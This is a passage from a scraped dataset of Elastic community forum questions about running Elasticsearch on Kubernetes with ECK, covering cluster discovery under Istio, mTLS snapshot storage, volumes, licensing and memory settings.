    "body": "I am testing the ECK with istio service mesh. Used the documentation provided. It worked fine when istio is installed without istio CNI We are using istio 1.4.3 When istio CNI is installed, elastic components are not able to communicate with each other {\"type\": \"server\", \"timestamp\": \"2020-04-10T14:22:58,205Z\", \"level\": \"WARN\", \"component\": \"o.e.c.c.ClusterFormationFailureHelper\", \"cluster.name\": \"test-elastic\", \"node.name\": \"test-elastic-es-master-nodes-0\", \"message\": \"master not discovered yet, this node has not previously joined a bootstrapped (v7+) cluster, and this node must discover master-eligible nodes [test-elastic-es-master-nodes-0, test-elastic-es-master-nodes-1, test-elastic-es-master-nodes-2] to bootstrap a cluster: have discovered [{test-elastic-es-master-nodes-0}{XN50bfmpTAO5yhIuwXH0Pw}{5aCYo0QIRzS7Oujah6YcEQ}{192.168.201.11}{192.168.201.11:9300}{m}{xpack.installed=true}]; discovery will continue using [127.0.0.1:9300, 127.0.0.1:9301, 127.0.0.1:9302, 127.0.0.1:9303, 127.0.0.1:9304, 127.0.0.1:9305, [::1]:9300, [::1]:9301, [::1]:9302, [::1]:9303, [::1]:9304, [::1]:9305, 192.168.106.77:9300, 192.168.239.150:9300] from hosts providers and [{test-elastic-es-master-nodes-0}{XN50bfmpTAO5yhIuwXH0Pw}{5aCYo0QIRzS7Oujah6YcEQ}{192.168.201.11}{192.168.201.11:9300}{m}{xpack.installed=true}] from last-known cluster state; node term 0, last-accepted version 0 in term 0\" } {\"type\": \"server\", \"timestamp\": \"2020-04-10T14:23:08,207Z\", \"level\": \"WARN\", \"component\": \"o.e.c.c.ClusterFormationFailureHelper\", \"cluster.name\": \"test-elastic\", \"node.name\": \"test-elastic-es-master-nodes-0\", \"message\": \"master not discovered yet, this node has not previously joined a bootstrapped (v7+) cluster, and this node must discover master-eligible nodes [test-elastic-es-master-nodes-0, test-elastic-es-master-nodes-1, test-elastic-es-master-nodes-2] to bootstrap a cluster: have discovered [{test-elastic-es-master-nodes-0}{XN50bfmpTAO5yhIuwXH0Pw}{5aCYo0QIRzS7Oujah6YcEQ}{192.168.201.11}{192.168.201.11:9300}{m}{xpack.installed=true}]; discovery will continue using [127.0.0.1:9300, 127.0.0.1:9301, 127.0.0.1:9302, 127.0.0.1:9303, 127.0.0.1:9304, 127.0.0.1:9305, [::1]:9300, [::1]:9301, [::1]:9302, [::1]:9303, [::1]:9304, [::1]:9305, 192.168.106.77:9300, 192.168.239.150:9300] from hosts providers and [{test-elastic-es-master-nodes-0}{XN50bfmpTAO5yhIuwXH0Pw}{5aCYo0QIRzS7Oujah6YcEQ}{192.168.201.11}{192.168.201.11:9300}{m}{xpack.installed=true}] from last-known cluster state; node term 0, last-accepted version 0 in term 0\" }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9c11c085-50ff-40c1-beb7-6a8b6a69d8be",
    "url": "https://discuss.elastic.co/t/how-to-add-certificates-to-java-keystore/223546",
    "title": "How to add certificates to java keystore",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "bikkina_mahesh",
    "date": "March 13, 2020, 5:09pm April 9, 2020, 6:54pm April 9, 2020, 5:55pm April 12, 2020, 10:01am April 14, 2020, 8:30am",
    "body": "I need to connect to S3 repo from elasticsearch to store snapshots. Our S3 endpoint has mutual ssl authentication. I have ca.crt, client.key, client.crt. How to add these certs to java keystore, so that I can connect to s3 repository from elasticsearch.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b0b66961-e07d-481c-983d-dd96dbc35bd3",
    "url": "https://discuss.elastic.co/t/upgrade-license-in-eck-to-try-some-platinum-features/227556",
    "title": "Upgrade license In ECK to try some platinum features",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "April 10, 2020, 7:37pm April 14, 2020, 8:25am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7a5d3a35-dee3-40dd-a5ec-e676e44ba0e6",
    "url": "https://discuss.elastic.co/t/deploy-elasticsearch-with-eck-without-pv-or-pvc/227795",
    "title": "Deploy elasticsearch with ECK without pv or pvc",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tsbayne",
    "date": "April 13, 2020, 6:52pm April 14, 2020, 8:04am",
    "body": "We do not utilize PV or PVC in our environment. Any persistent storage is utilized via a smb connection to a fileserver. I had elasticsearch working as a poc, but now I can't figure out how to get the production setup we want. It's time to reach out to the community for guidance. When following the quickstart, there is mention of being able to utilize an empty directory for the elasticsearch-data directory. This was the only way I ever got elasticsearch to deploy reliably at first. I then toyed with it enough to get it to work utilizing a host path. I mounted that host path to our file server. It was hacky, but it did work (I thought). - name: elasticsearch-data hostPath: path: /data/eck-elasticsearch But I was wrong. The host path only works if the smb connection isn't made. If the smb share is mounted to the host path, deploying elasticsearch fails. Here are the relevant errors from the init-container: chowning /usr/share/elasticsearch/data to elasticsearch:elasticsearch chown: changing ownership of '/usr/share/elasticsearch/data': Permission denied failed to change ownership of '/usr/share/elasticsearch/data' from root:root to elasticsearch:elasticsearch Ultimately, what I would really like to do is connect the elasticsearch-data the same way we attach all our other persistent storage, but at this point I'll do whatever we can get working. As an example, for our apps that need persistent storage currently this is how we do it: volumeMounts: - name: data-mount mountPath: /usr/src/app/data volumes: - name: data-mount flexVolume: driver: \"fstab/cifs\" fsType: \"cifs\" secretRef: name: \"secret\" options: networkPath: \"//server-name/share-name\" mountOptions: \"dir_mode=0755,file_mode=0644,noperm\" I see the same error in the init-container when I try to connect this way: chowning /usr/share/elasticsearch/data to elasticsearch:elasticsearch chown: changing ownership of '/usr/share/elasticsearch/data': Permission denied failed to change ownership of '/usr/share/elasticsearch/data' from root:root to elasticsearch:elasticsearch Thank you community for your help. You have always pointed me in the right direction when I seem completely turned around.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8a392e8e-aa03-4690-9de0-e26009db2540",
    "url": "https://discuss.elastic.co/t/volume-claim-templates-cannot-be-modified/219493",
    "title": "Volume claim templates cannot be modified",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "NickL2",
    "date": "February 15, 2020, 8:48pm February 17, 2020, 8:47am February 17, 2020, 3:54pm April 9, 2020, 7:53am April 9, 2020, 8:28am April 10, 2020, 8:57am April 10, 2020, 9:52am April 10, 2020, 12:01pm April 10, 2020, 8:39pm",
    "body": "Hi there, I'm trying to upgrade my ECK cluster by bumping up the apiVersion from elasticsearch.k8s.elastic.co/v1beta1 to elasticsearch.k8s.elastic.co/v1 and bumping the version from 7.5.1 to 7.6.0. After applying the configuration the logs display: {\"level\":\"error\",\"@timestamp\":\"2020-02-15T20:37:22.044Z\",\"logger\":\"controller-runtime.controller\",\"message\":\"Reconciler error\",\"ver\":\"1.0.1-bcb74688\",\"controller\":\"elasticsearch-controller\",\"request\":\"default/quickstart\",\"error\":\"admission webhook \\\"elastic-es-validation-v1.k8s.elastic.co\\\" denied the request: Elasticsearch.elasticsearch.k8s.elastic.co \\\"quickstart\\\" is invalid: spec.nodeSet[2].volumeClaimTemplates: Invalid value: []v1.PersistentVolumeClaim{v1.PersistentVolumeClaim{TypeMeta:v1.TypeMeta{Kind:\\\"\\\", APIVersion:\\\"\\\"}, ObjectMeta:v1.ObjectMeta{Name:\\\"elasticsearch-data\\\", GenerateName:\\\"\\\", Namespace:\\\"\\\", SelfLink:\\\"\\\", UID:\\\"\\\", ResourceVersion:\\\"\\\", Generation:0, CreationTimestamp:v1.Time{Time:time.Time{wall:0x0, ext:0, loc:(*time.Location)(nil)}}, DeletionTimestamp:(*v1.Time)(nil), DeletionGracePeriodSeconds:(*int64)(nil), Labels:map[string]string(nil), Annotations:map[string]string(nil), OwnerReferences:[]v1.OwnerReference(nil), Finalizers:[]string(nil), ClusterName:\\\"\\\", ManagedFields:[]v1.ManagedFieldsEntry(nil)}, Spec:v1.PersistentVolumeClaimSpec{AccessModes:[]v1.PersistentVolumeAccessMode{\\\"ReadWriteOnce\\\"}, Selector:(*v1.LabelSelector)(nil), Resources:v1.ResourceRequirements{Limits:v1.ResourceList(nil), Requests:v1.ResourceList{\\\"storage\\\":resource.Quantity{i:resource.int64Amount{value:3298534883328, scale:0}, d:resource.infDecAmount{Dec:(*inf.Dec)(nil)}, s:\\\"3Ti\\\", Format:\\\"BinarySI\\\"}}}, VolumeName:\\\"\\\", StorageClassName:(*string)(0xc001120c50), VolumeMode:(*v1.PersistentVolumeMode)(nil), DataSource:(*v1.TypedLocalObjectReference)(nil)}, Status:v1.PersistentVolumeClaimStatus{Phase:\\\"\\\", AccessModes:[]v1.PersistentVolumeAccessMode(nil), Capacity:v1.ResourceList(nil), Conditions:[]v1.PersistentVolumeClaimCondition(nil)}}}: Volume claim templates cannot be modified\",\"stacktrace\":\"github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/pkg/mod/github.com/go-logr/zapr@v0.1.0/zapr.go:128\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).reconcileHandler\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/internal/controller/controller.go:258\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).processNextWorkItem\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/internal/controller/controller.go:232\\nsigs.k8s.io/controller-runtime/pkg/internal/controller.(*Controller).worker\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.4.0/pkg/internal/controller/controller.go:211\\nk8s.io/apimachinery/pkg/util/wait.JitterUntil.func1\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20191028221656-72ed19daf4bb/pkg/util/wait/wait.go:152\\nk8s.io/apimachinery/pkg/util/wait.JitterUntil\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20191028221656-72ed19daf4bb/pkg/util/wait/wait.go:153\\nk8s.io/apimachinery/pkg/util/wait.Until\\n\\t/go/pkg/mod/k8s.io/apimachinery@v0.0.0-20191028221656-72ed19daf4bb/pkg/util/wait/wait.go:88\"} This suggests that at some point the volume claim template was modified but is there anything in this that tells me which volume claim template it is and what the value should actually be? Will changing it back fix this? Thanks!",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "79bca853-12c7-44fe-afab-a27e8c0919c6",
    "url": "https://discuss.elastic.co/t/eck-operator-invalid-license/227322",
    "title": "ECK Operator Invalid License",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "April 9, 2020, 12:56pm April 9, 2020, 6:34pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ebe21bad-ee3a-4b0b-a415-83d4a29d7051",
    "url": "https://discuss.elastic.co/t/installing-things-on-es-startup/226913",
    "title": "Installing things on ES startup",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "TimWardFS",
    "date": "April 7, 2020, 2:12pm April 9, 2020, 9:20am April 9, 2020, 9:34am April 9, 2020, 11:38am April 9, 2020, 11:53am April 9, 2020, 1:14pm",
    "body": "How to make sure something gets installed into ES on startup? Just right now I'm looking at users and roles, but there are probably other things we want to get in through the HTTP API after ES has started up but before clients try to collect to it. I'm currently getting Logstash to install the one and only template allowed during its startup, but that's obviously not a general solution. I note various discussions about users and roles, but no actual answer? One approach might be to have each client application install the users and roles that it needs in an init container, but I haven't worked out the security implications of this and it sounds like an awful lot of work.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "c602bb88-6ea9-41c8-9cb3-2cacbd78ed17",
    "url": "https://discuss.elastic.co/t/minor-security-vulnerability/217244",
    "title": "Minor security vulnerability",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "bigdamhero",
    "date": "January 30, 2020, 4:43pm April 9, 2020, 12:57pm",
    "body": "There was a minor vulnerability reported with JDK 1.13.0 1 azure-eck1357×213 8.31 KB I'm guessing we have to wait till this image is updated to use the newest minor version?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d6af8eba-e2da-4025-bdfd-90d86473743b",
    "url": "https://discuss.elastic.co/t/no-x-pack-plugins-loaded-by-default/224270",
    "title": "No X-PACK plugins loaded by default?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "doctor",
    "date": "March 19, 2020, 1:21pm April 9, 2020, 12:52pm April 9, 2020, 12:52pm",
    "body": "Hey, I read that in ECK, the X-PACK plugins were already loaded. But when I try GET /_cat/plugins I get nothing. Is this because X-PACK is not in the style of plugins anymore and its already there as core funtionnalities or I just don't have any X-PACK plugings and need to install them ? Using ECK v1.0 Env: On premise Thx",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c1645ca6-0199-44a8-950a-2d5163602769",
    "url": "https://discuss.elastic.co/t/elastic-operator-all-in-one-can-read-all-secrets-in-all-namespaces/226218",
    "title": "Elastic operator all-in-one can read all secrets in all namespaces",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "data_smith",
    "date": "April 2, 2020, 1:12pm April 9, 2020, 11:48am",
    "body": "The Elastic operator all-in-one install can read all secrets in all namespaces. Are there plans to make it more secure?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fca24bae-7832-4372-8970-8c89af9fb5ec",
    "url": "https://discuss.elastic.co/t/no-endpoints-for-port-9300/221542",
    "title": "No Endpoints for port 9300",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dtapia",
    "date": "February 29, 2020, 9:40pm March 1, 2020, 4:30pm March 13, 2020, 9:59pm April 7, 2020, 12:54pm",
    "body": "When I deploy a new instance of ECK, I only see services with port 9200 service/r4e-elasticsearch-datastore-cluster-es-http ClusterIP 10.224.83.227 <none> 9200/TCP 3h37m service/r4e-elasticsearch-datastore-cluster-kb-http ClusterIP 10.224.85.11 <none> 5601/TCP 3h37m pod/r4e-elasticsearch-datastore-cluster-es-default-0 1/1 Running 0 3h37m pod/r4e-elasticsearch-datastore-cluster-kb-65b79d76c9-pwpgg 1/1 Running 0 3h37m I need a java app to connect to port 9300 for TCP, is this available on ECK?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "60f15b14-e487-427a-a54c-8d8630dbeb54",
    "url": "https://discuss.elastic.co/t/elasticsearch-mtls-connection-to-s3-minio-based-to-store-snapshots/226690",
    "title": "Elasticsearch mTLS connection to S3 (minio based) to store snapshots",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "bikkina_mahesh",
    "date": "April 6, 2020, 11:22am",
    "body": "Hi All, I want to store snapshots in s3 storage where it requires mutual auth (mTLS) ( Note : S3 is minio based) I have client.crt, client.key, root.crt at the client side. I tried these steps, apiVersion: elasticsearch.k8s.elastic.co/v1beta1 kind: Elasticsearch metadata: name: eck namespace: test spec: version: 7.2.0 nodeSets: - count: 1 name: master config: xpack.security.authc.realms: &xpack-realms file.file1: order: 0 native.native1: order: 1 node.master: true node.data: true node.ingest: true node.ml: false cluster.remote.connect: false podTemplate: spec: initContainers: - name: sysctl securityContext: privileged: true command: ['sh', '-c', 'sysctl -w vm.max_map_count=262144'] - name: pem-to-keystore env: - name: keyfile value: /var/run/secrets/certs/client-key.pem - name: crtfile value: /var/run/secrets/certs/client-crt.pem - name: keystore_pkcs12 value: /var/run/secrets/keystore/keystore.pkcs - name: keystore_jks value: /var/run/secrets/keystore/keystore.jks - name: password value: changeit - name: http_proxy value: http://192.30.48.24:8080 - name: https_proxy value: http://192.30.48.24:8080 command: ['/bin/bash'] args: ['-c', \"yum install -y openssl && openssl pkcs12 -export -inkey $keyfile -in $crtfile -out $keystore_pkcs12 -password pass:$password && /usr/share/elasticsearch/jdk/bin/keytool -importkeystore -noprompt -srckeystore $keystore_pkcs12 -srcstoretype pkcs12 -destkeystore $keystore_jks -storepass $password -srcstorepass $password\"] volumeMounts: - name: keystore-volume mountPath: /var/run/secrets/keystore - name: s3-client-certs mountPath: /var/run/secrets/certs - name: pem-to-truststore env: - name: truststore_jks value: /var/run/secrets/keystore/truststore.jks - name: cafile value: /var/run/secrets/certs/ca-crt.pem - name: password value: changeit command: ['/bin/bash'] args: ['-c', \"/usr/share/elasticsearch/jdk/bin/keytool -import -alias mycert -file $cafile -keystore $truststore_jks -deststorepass $password -noprompt \"] volumeMounts: - name: keystore-volume mountPath: /var/run/secrets/keystore - name: s3-client-certs mountPath: /var/run/secrets/certs - name: s3-bucket-auth mountPath: /var/run/secrets/auth - name: install-plugins env: - name: ES_JAVA_OPTS value: -Dhttp.proxyHost=192.30.48.24 -Dhttp.proxyPort=8080 -Dhttps.proxyHost=192.30.48.24 -Dhttps.proxyPort=8080 command: - sh - -c - | bin/elasticsearch-plugin install --batch repository-s3 containers: - name: elasticsearch env: - name: ES_JAVA_OPTS value: -Xms1g -Xmx1g -Dhttp.proxyHost=192.30.48.24 -Dhttp.proxyPort=8080 -Dhttps.proxyHost=192.30.48.24 -Dhttps.proxyPort=8080 -Djavax.net.ssl.trustStore=/var/run/secrets/keystore/truststore.jks -Djavax.net.ssl.trustStorePassword=changeit -Djavax.net.ssl.trustStoreType=jks -Djavax.net.ssl.keyStore=/var/run/secrets/keystore/keystore.jks -Djavax.net.ssl.keyStorePassword=changeit -Djavax.net.ssl.keyStoreType=jks resources: limits: memory: 4Gi cpu: 1000m volumeMounts: - mountPath: /var/run/secrets/keystore name: keystore-volume - name: s3-client-certs mountPath: /var/run/secrets/certs volumes: - name: keystore-volume emptyDir: {} - name: s3-client-certs secret: secretName: gaja volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce storageClassName: elastic-block resources: requests: storage: 100Gi when I tried to create a bucket PUT _snapshot/my_s3_repository { \"type\": \"s3\", \"settings\": { \"bucket\": \"mybucket\", \"endpoint\": \"s3.tally.srv.prod.k-net.com\" } } Output: { \"error\": { \"root_cause\": [ { \"type\": \"repository_verification_exception\", \"reason\": \"[my_s3_repository] path is not accessible on master node\" } ], \"type\": \"repository_verification_exception\", \"reason\": \"[my_s3_repository] path is not accessible on master node\", \"caused_by\": { \"type\": \"i_o_exception\", \"reason\": \"Unable to upload object [tests-mK_2xuEeTHeKLpxWJidD_g/master.dat] using a single upload\", \"caused_by\": { \"type\": \"amazon_s3_exception\", \"reason\": \"SSL Certificate Required (Service: Amazon S3; Status Code: 496; Error Code: 496 SSL Certificate Required; Request ID: null; S3 Extended Request ID: null)\" } } }, \"status\": 500 } I am not really knowing, what to do here. I am stuck here. can anyone please help me with this. Thanks Mahesh",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "879ae646-da98-49c4-be4f-ebfdf35e41a8",
    "url": "https://discuss.elastic.co/t/how-to-make-logstash-talk-to-elasticsearch/226080",
    "title": "How to make Logstash talk to Elasticsearch?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "TimWardFS",
    "date": "April 1, 2020, 3:31pm April 1, 2020, 3:38pm April 2, 2020, 1:25pm April 6, 2020, 10:23am",
    "body": "I have Elasticsearch running in K8s via the operator, and want to talk to it from Logstash. Everything I've tried so far has failed, mostly resulting in [2020-04-01T15:25:22,773][WARN ][logstash.outputs.elasticsearch] Attempted to resurrect connection to dead ES instance, but got an error. {:url=>\"http://elasticsearch-es-http:9200/\", :error_type=>LogStash::Outputs::ElasticSearch::HttpClient::Pool::HostUnreachableError, :error=>\"Elasticsearch Unreachable: [http://elasticsearch-es-http:9200/][Manticore::ClientProtocolException] elasticsearch-es-http:9200 failed to respond\"} I don't want to worry about TLS just yet - I want to make it work first, and worry about security later. I have found hints that it's necessary to turn off TLS via spec: http: tls: selfSignedCertificate: disabled: true but that doesn't make any difference.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "07707a31-ba04-4e06-9692-f39c1199feed",
    "url": "https://discuss.elastic.co/t/difficulty-installing-eck-in-a-single-namespace/225891",
    "title": "Difficulty installing ECK in a single namespace",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "data_smith",
    "date": "March 31, 2020, 2:41pm March 31, 2020, 3:51pm April 2, 2020, 1:19pm April 3, 2020, 2:37pm April 3, 2020, 2:14pm",
    "body": "I ran the script: OPERATOR_NAME=myelastic-op OPERATOR_IMAGE=docker.elastic.co/eck/eck-operator:1.0.1 NAMESPACE=myns MANAGED_NAMESPACE=myns make generate-namespace | kubectl apply -f - And it works up until I get this error in the pod: message: \"unable to setup and fill webhook certificates\", error=\"resource may not be empty\" Do I need to set something up beforehand?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "8b330481-2ce1-4ac1-8289-325e4fdeaa0b",
    "url": "https://discuss.elastic.co/t/eck-0-8-0-keeps-creating-and-deleting-nodes/225321",
    "title": "ECK 0.8.0 keeps creating and deleting nodes",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "huntlyroad",
    "date": "March 27, 2020, 2:22am April 2, 2020, 1:10pm April 3, 2020, 3:14am April 3, 2020, 9:58am April 3, 2020, 9:59am April 3, 2020, 10:12am",
    "body": "Hi, I'm using ECK 0.8.0 to manage my es cluster in k8s. It started more than half year ago and worked fine. However, recently when I tried to scale up my data nodes ( from 5 to 8). Unexpected behaviours are observed. Here's my original setup: apiVersion: elasticsearch.k8s.elastic.co/v1alpha1 kind: Elasticsearch metadata: name: async-search namespace: elasticsearch spec: version: 7.1.0 nodes: - nodeCount: 3 config: node.master: true node.data: false node.ingest: false #some pod template settings # ... volumeClaimTemplates: - metadata: name: data spec: accessModes: - ReadWriteOnce resources: requests: storage: 50Gi storageClassName: local selector: matchLabels: master: true - nodeCount: 5 config: node.master: false node.data: true node.ingest: false # rest same as master - nodeCount: 2 config: node.master: false node.data: false node.ingest: false # this is the coordinator node # settings similar to above updateStrategy: changeBudget: maxSurge: 0 maxUnavailable: 1 So basically I have 3 master nodes, 5 data nodes, 2 coordinator nodes. Here's what happened when I trying to add more nodes to scale: I tried to add 3 more coordinator nodes. expected: ECK add 3 more coordinator nodes to the cluster observed: ECK added 1 coordinator and 2 data nodes first and because I didn't provision any pv for data nodes. 2 of them keeps pending. I tried to add 3 more data nodes and 1 more coordinator nodes: expected: ECK add 3 more data nodes and waits for data migrating to complete and then terminates one of the old nodes. starts another one. at some point, coordinator nodes is added correctly, however the process of deleting and adding data nodes never stops. I checked opeartor log, it keeps printing {\"level\":\"info\",\"ts\":1585191461.1530027,\"logger\":\"driver\",\"msg\":\"Calculated all required changes\",\"to_create:\":8,\"to_keep:\":6,\"to_delete:\":8} This behaviour kept about 24 hours I thought this is never gonna stop So I changed max unavailable to 0 and because of this, it stopped deleting old nodes. However, it still trying to create a new node. I don't know how this happens, Can anyone help me on this one. BTW I can't upgrade to 1.0 for now because this environment is heavily used by production so it's not easy to migrate to 1.0 now. Thanks",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "19a773df-c546-4566-befa-ffedb9a56c15",
    "url": "https://discuss.elastic.co/t/100-cpu-usage-on-data-nodes/226079",
    "title": "100% CPU-Usage on data nodes",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Mugen",
    "date": "April 1, 2020, 3:48pm April 2, 2020, 1:23pm",
    "body": "Hi Guys. We currently run ECK with 3 master- and 4 data nodes. Our data nodes jump up to 100% cpu with some querys (its an easy querie for one keyword field) We are using ECK 1.0.1 and Elasticsearch 7.6 The configuration is as follows : resources data nodes: esJavaOpts: \"-Xms8000m -Xmx8000m -XX:MaxMetaspaceSize=1G\" resources: requests: cpu: 3000m memory: 16000Mi limits: cpu: 3000m memory: 16000Mi storage: 1000Gi Index Info : (One Index for each day but we mostly query 1 day) Primaries: 4 Docs Count: 155582677 Storage Size: 221.2gb Replicas: 2 Used Query: { \"query\": { \"match_phrase\": { \"our.searched.field\": \"value\" } } } The data node does not log any error. But the monitoring clearly shows the cpu rise to 100% for a certain time. Should we change the shards of our indexes or give more cpu or something else?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "82430b19-5ef3-4b35-8c3d-eab406b1f24d",
    "url": "https://discuss.elastic.co/t/how-to-temporarily-stop-a-single-node-for-storage-maintenance/225202",
    "title": "How to temporarily stop a single node for storage maintenance",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dkvz",
    "date": "March 26, 2020, 1:57pm April 2, 2020, 1:05pm",
    "body": "Hi, I'm currently running experiments with ECK and a 3-nodes Elasticsearch cluster with 2 data/master and one master only. The idea is that the data nodes are each on their own different storage system (this is a bare metal k8s) and I use 1 replica for all my indices. Let's say I have to do maintenance on one of the storages, I noticed that if I just forcibly take out the storage with no action, reads can continue normally but all writes will error (node is still marked online) unless I force delete the pod that can no longer write using kubectl (writing can resume if I do as the ES node is then marked offline). Is there a way to temporarily remove one of my data nodes so that I can take down its storage for a while? Using kubectl delete obviously causes a restart of the pod. I thought of just editing the deployment (the Elasticsearch k8s resource) and removing the node from it. But if I re-add it will it find all its previous storage and be cool with it? Thanks for your time,",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "557bd2b8-ad92-4b6d-9966-18989513c415",
    "url": "https://discuss.elastic.co/t/no-matches-for-kind/226119",
    "title": "No matches for kind",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "data_smith",
    "date": "April 1, 2020, 7:31pm April 1, 2020, 8:10pm April 2, 2020, 9:55am April 2, 2020, 12:58pm",
    "body": "I'm trying to install ECK but I'm getting \"no matches for Kind\" errors with the kind being Elasticsearch or Kibana. Anyone run into this and know the solution?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "267fe5c0-9932-4acb-8365-b1866f6a8058",
    "url": "https://discuss.elastic.co/t/does-eck-support-local-persistent-disks-and-is-it-a-good-idea/223515",
    "title": "Does ECK support local persistent disks and is it a good idea?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "weeco",
    "date": "March 13, 2020, 1:19pm March 13, 2020, 4:28pm March 13, 2020, 7:56pm April 2, 2020, 12:53pm",
    "body": "Hello, I am using GKE and we'd like to build several Elasticsearch Clusters using ECK. Some of them will be rather big (10+ TB) and have a decent throughput (1+ TB per day), others are smaller. We are wondering whether it's a good idea to use local persistent disk (instead of persistent volumes) as they offer way better performance characteristics at a cheaper price ($0.08 instead of $0.17 per SSD GB month). I am fully aware that the local persistent disk has a few downsides such as: It is bound to a single Kubernetes node It can not be resized Data loss is possible as it's not redundant as opposed to persistent volumes You must use a multiple of 375GB partitions and the performance scales with the size/number of the disk/partitions as well However even after considering these downsides I think it could be a good idea to use them (maybe only for our hot nodes?). The resizing problem can be fixed by adding or removing ES nodes, Data loss risk can be reduced by using Elasticsearch replicas which also improves the read performance as replicas will be queried. My only concern is whether ECK supports that? Whenever a node is removed the data must be transferred to a different node or it will be lost. As a node dies the disk is gone as well right? Are there any other concerns/issues which I should be aware of? I am surprised the documentation barely discusses this topic given the potential performance impact.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "152fdc21-4ddc-4e3e-86e5-7e314aba43e3",
    "url": "https://discuss.elastic.co/t/settings-xmx-via-stetefulsets-does-not-increase-pod-memory-even-after-re-creating-pod/226083",
    "title": "Settings Xmx via stetefulSets does not increase pod memory even after re-creating pod",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "scarby",
    "date": "April 1, 2020, 3:58pm April 1, 2020, 11:50pm April 2, 2020, 12:27pm",
    "body": "i have the following elastic-search deployment described: apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: annotations: common.k8s.elastic.co/controller-version: 1.0.0 elasticsearch.k8s.elastic.co/cluster-uuid: 1gZHNvZSSwK_0jP7QrFJpg creationTimestamp: \"2020-01-30T04:21:35Z\" generation: 6 name: logs namespace: logs resourceVersion: \"33407416\" selfLink: /apis/elasticsearch.k8s.elastic.co/v1/namespaces/logs/elasticsearches/logs uid: d346d27a-1717-4627-b34a-2aaf86de020f spec: http: service: metadata: creationTimestamp: null spec: type: LoadBalancer tls: certificate: secretName: magneto-tls nodeSets: - config: node.data: true node.ingest: true node.master: true node.store.allow_mmap: true count: 3 name: default podTemplate: metadata: creationTimestamp: null spec: containers: - env: - name: ES_JAVA_OPTS value: -Xms4g -Xmx4g name: elasticsearch resources: requests: memory: 8Gi volumeClaimTemplates: - metadata: creationTimestamp: null name: elasticsearch-data namespace: logs spec: accessModes: - ReadWriteOnce resources: requests: storage: 100Gi storageClassName: gce-ssd status: {} updateStrategy: changeBudget: {} version: 7.5.0 Initially this started off with using the default settings for java options. However our deployment began to fall over due to the default memory settings simply not being enough. As such the ES_JAVA_OPTIONS flag was added, unfortunately this has not changed anything, even forcing deletion and re-creation of the pod does not lead to the increase in Xmx or Xmx on the container. usr/share/elasticsearch/jdk/bin/java -Des.networkaddress.cache.ttl=60 -Des.networkaddress.cache.negative.ttl=10 -XX:+AlwaysPreTouch -Xss1m -Djava.awt.headless=true -Dfile.encoding=UTF is still used for java options. I'm not sure i'm doing something wrong here or if this is a bug?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f943b3d9-2243-45a4-a40f-72fb1e8fedc8",
    "url": "https://discuss.elastic.co/t/failed-to-ensure-load-balancer-for-service-default-quickstart-es-http/226078",
    "title": "Failed to ensure load balancer for service default/quickstart-es-http",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tillias",
    "date": "April 1, 2020, 3:30pm April 1, 2020, 3:43pm April 1, 2020, 4:00pm April 1, 2020, 7:27pm April 2, 2020, 6:30am April 2, 2020, 7:38am April 2, 2020, 11:17am April 2, 2020, 12:05pm",
